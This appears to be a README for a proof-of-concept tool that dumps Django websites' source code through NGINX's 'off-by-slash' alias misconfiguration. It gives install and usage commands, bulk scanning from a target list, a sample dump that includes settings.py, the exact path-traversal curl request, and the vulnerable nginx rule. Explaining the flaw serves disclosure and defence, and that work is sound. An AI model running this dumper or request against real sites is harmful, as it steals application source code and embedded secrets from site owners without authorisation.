# POC: Off-by-slash Django Site Dumper

A proof of concept to dump Django websites affected by NGINX's off-by-slash misconfiguration.


## Installation

```bash
$ git clone https://github.com/adamyordan/offbyslash-django-dumper
$ cd offbyslash-django-dumper
$ pip install -r requirements.txt
```


## Usage
Pass target url as argument
```bash
$ python main.py --url http://django-site.com/
```

Or using files containing multiple target urls
```bash
$ cat targets.txt
http://django-site.com/
https://other-affected-site.org/
http://cool-website.me/

$ python main.py --file targets.txt
```

The result is available at `dump` directory
```
$ tree dump

dump/
└── http-django-site.com-
    ├── api
    │   ├── urls.py
    │   ├── users.py
    │   └── views.py
    ├── common
    │   └── logger.py
    ├── manage.py
    └── app
        ├── __init__.py
        ├── settings.py
        ├── urls.py
        ├── validate.py
        └── wsgi.py
```

## Explanation

This dumper works by using a local file inclusion vulnerability caused by a misconfiguration when using NGINX to serve 
static files.

Equivalent curl command used by this dumper to dump local files is shown as below:
```bash
$ curl http://django-site.com/static../manage.py
```

Affected sites will return a response with status `200 OK` and body containing the source code of `manage.py` file.


This local file inclusion is caused by a slight but fatal mistake in Nginx's configuration, some people named it 
_Nginx off-by-slash fail_.

For example, here is a snippet of affected nginx rule:
```
location /static {
    alias /home/app/static/;
}
```

By sending a request to `http://affected-site.com/static../manage.py`, Nginx matches the rule and appends the remainder 
to destination `/home/app/static/../manage.py`. Therefore serving the `manage.py` as static file.


This dumper utilize vulnerability to automatically crawl the source code of Django sites, inferring available
source code files by using static analysis (read: pattern matching!).
